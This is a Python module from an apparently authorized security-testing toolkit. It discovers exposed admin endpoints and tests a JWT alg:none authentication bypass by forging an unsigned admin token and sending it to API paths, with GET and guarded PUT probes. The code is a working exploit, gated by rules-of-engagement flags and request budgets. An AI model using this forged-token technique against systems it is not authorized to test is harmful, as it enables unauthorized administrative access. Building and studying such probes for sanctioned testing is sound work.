"""Auth-bypass probe — admin path discovery and JWT alg:none bypass.

Three techniques:
1. Admin path discovery: try common admin/API endpoints; flag 200s that aren't
   login-page redirects.
2. JWT alg:none GET: craft an unsigned JWT, present it as a Bearer token, check
   whether the server accepts it for protected GET paths.
3. JWT alg:none write (requires auth_testing_authorized=True AND
   mutation_testing_authorized=True in roe.md): PUT to <api-path>/99999 with
   unsigned JWT; a 404 after a 401 baseline confirms write-level auth bypass
   without mutating state (non-existent ID).
"""

from __future__ import annotations

import base64
import json
import time
from urllib.parse import urljoin

import httpx

from earn_money.recon.signals import Signal
from earn_money.triage import hashing

ADMIN_PATHS: tuple[str, ...] = (
    "/admin",
    "/api/Users",
    "/api/SecurityAnswers",
    "/api/Feedbacks",
    "/rest/admin/application-configuration",
    "/administration",
    "/manage",
    "/management",
    "/admin/users",
    "/api/admin",
)

_LOGIN_INDICATORS = ("login", "signin", "sign-in", "authenticate", "401", "403")


def _make_alg_none_jwt(email: str = "admin@juice-sh.op", role: str = "admin") -> str:
    header = base64.urlsafe_b64encode(
        json.dumps({"typ": "JWT", "alg": "none"}).encode()
    ).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({"email": email, "role": role}).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{payload}."


def _is_login_redirect(resp: httpx.Response) -> bool:
    if resp.status_code in (301, 302, 303, 307, 308):
        loc = resp.headers.get("location", "").lower()
        return any(ind in loc for ind in _LOGIN_INDICATORS)
    body_lower = resp.text.lower()[:500]
    return any(ind in body_lower for ind in _LOGIN_INDICATORS)


def probe_service(
    base_url: str,
    *,
    client: httpx.Client,
    run_id: str,
    observed_at: str,
    auth_testing_authorized: bool = False,
    mutation_testing_authorized: bool = False,
    auth_lockout_budget: int = 0,
    request_interval: float = 0.0,
) -> list[Signal]:
    """Probe `base_url` for admin path access and JWT alg:none bypass."""
    signals: list[Signal] = []

    for path in ADMIN_PATHS:
        url = urljoin(base_url, path)
        try:
            resp = client.get(url)
            if request_interval:
                time.sleep(request_interval)
        except httpx.HTTPError:
            continue
        if resp.status_code == 200 and not _is_login_redirect(resp):
            content_type = resp.headers.get("content-type", "")
            if "/api/" in path and "application/json" not in content_type:
                continue
            if len(resp.content) < 50:
                continue
            signals.append(_make_signal(
                url, "admin_path_open",
                f"status={resp.status_code} len={len(resp.text)}",
                run_id=run_id, observed_at=observed_at,
            ))

    # JWT-bearing probes (GET + write) require explicit RoE authorization.
    if not auth_testing_authorized:
        return signals

    jwt = _make_alg_none_jwt()
    api_paths = [p for p in ADMIN_PATHS if "/api/" in p]

    write_authorized = auth_testing_authorized and mutation_testing_authorized
    jwt_remaining = auth_lockout_budget if auth_lockout_budget > 0 else len(api_paths) * 4
    get_jwt_cap = (jwt_remaining - 1) if write_authorized else jwt_remaining

    for path in api_paths:
        if get_jwt_cap <= 0 or jwt_remaining <= 0:
            break
        api_url = urljoin(base_url, path)
        try:
            resp = client.get(api_url, headers={"Authorization": f"Bearer {jwt}"})
            if request_interval:
                time.sleep(request_interval)
            jwt_remaining -= 1
            get_jwt_cap -= 1
            if resp.status_code == 200 and not _is_login_redirect(resp):
                signals.append(_make_signal(
                    api_url, "jwt_alg_none",
                    f"status={resp.status_code} len={len(resp.text)}",
                    run_id=run_id, observed_at=observed_at,
                ))
        except httpx.HTTPError:
            jwt_remaining -= 1
            get_jwt_cap -= 1

    if write_authorized and jwt_remaining > 0:
        for path in api_paths:
            if jwt_remaining <= 0:
                break
            sig = _probe_jwt_alg_none_write(
                path, base_url, jwt=jwt, client=client,
                run_id=run_id, observed_at=observed_at,
                request_interval=request_interval,
            )
            jwt_remaining -= 1
            if sig:
                signals.append(sig)

    return signals


def _probe_jwt_alg_none_write(
    path: str, base_url: str,
    *, jwt: str, client: httpx.Client, run_id: str, observed_at: str,
    request_interval: float = 0.0,
) -> Signal | None:
    """PUT to <path>/99999; establish auth baseline first, then test JWT bypass.

    Baseline (no JWT) must return 401/403 to confirm the route requires auth.
    404 with JWT confirms bypass (server processed past auth, resource absent).
    """
    write_url = urljoin(base_url, path.rstrip("/") + "/99999")
    try:
        # Baseline: confirm the endpoint requires auth when no JWT is presented.
        baseline = client.put(
            write_url, headers={"Content-Type": "application/json"}, content=b"{}",
        )
        if request_interval:
            time.sleep(request_interval)
    except httpx.HTTPError:
        return None
    if baseline.status_code not in (401, 403):
        # Route doesn't gate on auth — a 404 from the JWT probe would be ambiguous.
        return None
    try:
        resp = client.put(
            write_url,
            headers={"Authorization": f"Bearer {jwt}", "Content-Type": "application/json"},
            content=b"{}",
        )
    except httpx.HTTPError:
        return None
    if resp.status_code in (401, 403):
        return None
    # 404 = server processed past auth but resource absent (non-destructive by design).
    # 2xx = full acceptance (mutation_testing_authorized guards the write_authorized gate).
    if resp.status_code != 404 and resp.status_code not in range(200, 300):
        return None
    return _make_signal(
        write_url, "jwt_alg_none_write",
        f"status={resp.status_code} (expected 401/403 — write auth bypassed)",
        run_id=run_id, observed_at=observed_at,
    )


def _make_signal(
    url: str, kind: str, evidence: str,
    *, run_id: str, observed_at: str,
) -> Signal:
    asset = hashing.normalize_asset(url)
    target = hashing.normalize_target(url)
    signature = f"auth-bypass|{kind}|{target[:20]}"
    payload = json.dumps(
        {"url": url, "kind": kind, "evidence": evidence, "severity": "high"},
        sort_keys=True,
    )
    return Signal(
        run_id=run_id, tool="auth-bypass-probe", signal_type="auth_bypass_candidate",
        asset=asset, target=target, signature=signature,
        payload=payload, observed_at=observed_at,
    )
